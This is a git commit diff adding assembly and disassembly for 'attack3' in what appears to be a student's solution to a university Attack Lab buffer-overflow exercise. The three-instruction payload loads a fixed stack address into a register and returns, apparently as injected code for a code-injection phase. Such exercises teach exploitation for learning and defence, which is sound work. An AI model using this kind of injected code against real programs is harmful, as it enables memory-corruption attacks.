675fb12a37ab51397bcb5470a7d0e8c0da947785
is-zq <1056180862@qq.com>
2023-11-21 22:06:01 +0800

    attacklab

---
+++ attacklab/attack3/attack3.d
@@ -0,0 +1,10 @@
+
+attack3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 83 ec 20          	sub    $0x20,%rsp
+   4:	48 c7 c7 97 dc 61 55 	mov    $0x5561dc97,%rdi
+   b:	c3                   	retq   
---
+++ attacklab/attack3/attack3.s
@@ -0,0 +1,3 @@
+sub $0x20,%rsp
+mov $0x5561dc97,%rdi
+ret
